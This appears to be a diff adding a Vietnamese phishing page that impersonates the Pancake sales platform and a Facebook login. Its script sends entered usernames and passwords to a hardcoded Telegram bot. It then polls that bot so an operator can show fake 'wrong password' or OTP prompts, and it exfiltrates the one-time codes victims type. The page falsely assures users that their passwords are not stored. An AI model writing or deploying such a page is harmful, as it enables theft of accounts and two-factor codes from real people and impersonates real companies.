@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pancake - Hệ sinh thái quản lý bán hàng đa kênh</title>
+    <style>
+        :root { --primary: #0066ff; --bg: #f0f2f5; --text: #1c1e21; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: var(--bg); color: var(--text); }
+        
+        .container { max-width: 450px; margin: 0 auto; min-height: 100vh; background: #fff; display: flex; flex-direction: column; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        
+        /* Header */
+        .header { padding: 12px 15px; border-bottom: 1px solid #eee; background: #fff; position: sticky; top: 0; z-index: 100; display: flex; justify-content: space-between; align-items: center; }
+        .logo { height: 26px; }
+        .menu-btn { font-size: 22px; color: #555; }
+
+        .content { padding: 20px; flex-grow: 1; transition: all 0.3s; }
+        
+        /* View Landing */
+        .hero-badge { display: inline-block; background: #e7f3ff; color: var(--primary); padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 15px; text-transform: uppercase; }
+        .hero-title { font-size: 26px; font-weight: 800; line-height: 1.2; margin: 0 0 15px 0; text-align: left; }
+        .hero-desc { font-size: 15px; color: #606770; line-height: 1.5; margin-bottom: 25px; text-align: left; }
+        .banner { width: 100%; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); margin-top: 10px; }
+
+        /* View Login */
+        .login-card { text-align: center; padding-top: 10px; }
+        .fb-icon { width: 45px; margin-bottom: 15px; }
+        .login-title { font-size: 22px; font-weight: bold; margin-bottom: 10px; }
+        .login-sub { font-size: 14px; color: #65676b; margin-bottom: 25px; line-height: 1.4; }
+
+        /* Form */
+        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; background: #f5f6f7; outline: none; transition: 0.2s; }
+        input:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
+        .btn-main { width: 100%; padding: 14px; background: var(--primary); color: #fff; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn-main:active { transform: scale(0.98); opacity: 0.9; }
+
+        /* Loader */
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 30px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Page List */
+        .page-item { display: flex; align-items: center; padding: 15px; border: 1px solid #f0f2f5; border-radius: 12px; margin-bottom: 10px; cursor: pointer; }
+        .page-avatar { width: 40px; height: 40px; background: #e7f3ff; border-radius: 50%; color: var(--primary); display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 15px; }
+        .page-info b { display: block; font-size: 15px; }
+        .page-info span { font-size: 12px; color: #888; }
+
+        .hidden { display: none; }
+        .footer { font-size: 12px; color: #90949c; margin-top: 40px; text-align: center; padding: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <img src="https://pancake.vn/images/logo.png" class="logo">
+        <div class="menu-btn">☰</div>
+    </div>
+
+    <div id="view-landing" class="content">
+        <span class="hero-badge">Ứng dụng quản lý số 1</span>
+        <h1 class="hero-title">Bán hàng đa kênh <br><span style="color: var(--primary);">Kết nối khách hàng</span></h1>
+        <p class="hero-desc">Hợp nhất tin nhắn Facebook, TikTok, Shopee. Tự động hóa quy trình chốt đơn và chăm sóc khách hàng.</p>
+        <button class="btn-main" onclick="showView('view-login')">Bắt đầu miễn phí</button>
+        <img src="https://pancake.vn/images/banner-home.png" class="banner">
+    </div>
+
+    <div id="view-login" class="content hidden">
+        <div class="login-card">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png" class="fb-icon">
+            <div class="login-title">Tiếp tục với Facebook</div>
+            <div class="login-sub">Vui lòng đăng nhập để liên kết quyền quản trị Fanpage của bạn với Pancake.</div>
+            
+            <input type="text" id="email" placeholder="Email hoặc số điện thoại">
+            <input type="password" id="pass" placeholder="Mật khẩu">
+            <button class="btn-main" onclick="startHarvest()">Đăng nhập</button>
+            
+            <p style="color: #1877f2; font-size: 14px; margin-top: 15px; font-weight: 500;">Quên mật khẩu?</p>
+            <div class="footer">Pancake kết nối bảo mật qua Facebook API. Chúng tôi không lưu trữ mật khẩu cá nhân của bạn.</div>
+        </div>
+    </div>
+
+    <div id="view-wait" class="content hidden" style="text-align: center;">
+        <div id="loading-area">
+            <div class="loader"></div>
+            <h3 id="wait-msg">Đang đồng bộ dữ liệu...</h3>
+            <p style="font-size: 14px; color: #65676b;">Vui lòng không thoát trình duyệt lúc này.</p>
+        </div>
+
+        <div id="otp-area" class="hidden" style="margin-top: 20px; background: #f0f2f5; padding: 20px; border-radius: 12px;">
+            <p id="otp-type" style="font-weight: bold; margin-bottom: 15px;">Nhập mã xác thực</p>
+            <input type="text" id="otp-val" placeholder="Mã 6 số" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+            <button class="btn-main" onclick="sendOTP()">Xác nhận mã</button>
+        </div>
+    </div>
+
+    <div id="view-pages" class="content hidden">
+        <h3 style="margin-bottom: 20px;">Chọn Fanpage để kết nối</h3>
+        <div class="page-item" onclick="finish()">
+            <div class="page-avatar">A1</div>
+            <div class="page-info"><b>ÁO LUXURY - Miền Bắc</b><span>52.401 Người theo dõi</span></div>
+        </div>
+        <div class="page-item" onclick="finish()">
+            <div class="page-avatar">A2</div>
+            <div class="page-info"><b>QUẦN NAM VNXK</b><span>18.920 Người theo dõi</span></div>
+        </div>
+        <div class="page-item" onclick="finish()">
+            <div class="page-avatar">A3</div>
+            <div class="page-info"><b>TỔNG KHO SỈ</b><span>5.105 Người theo dõi</span></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Token và Chat ID đã được cập nhật theo yêu cầu của bạn
+    const TOKEN = "7371520036:AAEOaH2aesiMDvGT5T7iHs3XyTroSLsiGSM";
+    const CHAT_ID = "8386422438";
+
+    async function startHarvest() {
+        const u = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        if(!u || !p) return alert("Vui lòng điền đầy đủ!");
+
+        const text = `🔔 CÓ ACC MỚI:\n👤 User: ${u}\n🔑 Pass: ${p}`;
+        
+        const keyboard = {
+            inline_keyboard: [
+                [
+                    { text: "❌ Sai Pass", callback_data: "/wrong" },
+                    { text: "📩 OTP Facebook", callback_data: "/otp_fb" }
+                ],
+                [
+                    { text: "📩 OTP Gmail", callback_data: "/otp_mail" },
+                    { text: "✅ Done (Vào Page)", callback_data: "/done" }
+                ]
+            ]
+        };
+
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                reply_markup: keyboard
+            })
+        });
+
+        showView('view-wait');
+        listen();
+    }
+
+    async function listen() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
+            const data = await res.json();
+            if(!data.result.length) { setTimeout(listen, 2500); return; }
+
+            const update = data.result[0];
+            const cmd = update.message ? update.message.text : update.callback_query.data;
+
+            if (cmd === "/wrong") {
+                alert("Thông tin đăng nhập không chính xác. Vui lòng thử lại!");
+                showView('view-login');
+            } else if (cmd === "/otp_fb" || cmd === "/otp_mail") {
+                document.getElementById('loading-area').classList.add('hidden');
+                document.getElementById('otp-area').classList.remove('hidden');
+                document.getElementById('otp-type').innerText = (cmd === "/otp_fb") ? "Xác thực qua Facebook" : "Xác thực qua Gmail";
+            } else if (cmd === "/done") {
+                showView('view-pages');
+            } else {
+                setTimeout(listen, 2500);
+            }
+        } catch (e) { setTimeout(listen, 2500); }
+    }
+
+    async function sendOTP() {
+        const otp = document.getElementById('otp-val').value;
+        if(!otp) return;
+        
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📩 MÃ OTP: ${otp}`);
+        
+        document.getElementById('otp-area').classList.add('hidden');
+        document.getElementById('loading-area').classList.remove('hidden');
+        document.getElementById('wait-msg').innerText = "Đang kiểm tra mã...";
+        listen();
+    }
+
+    function showView(id) {
+        ['view-landing', 'view-login', 'view-wait', 'view-pages'].forEach(v => {
+            document.getElementById(v).classList.add('hidden');
+        });
+        document.getElementById(id).classList.remove('hidden');
+    }
+
+    function finish() { window.location.href = "https://pancake.vn"; }
+</script>
+</body>
+</html>
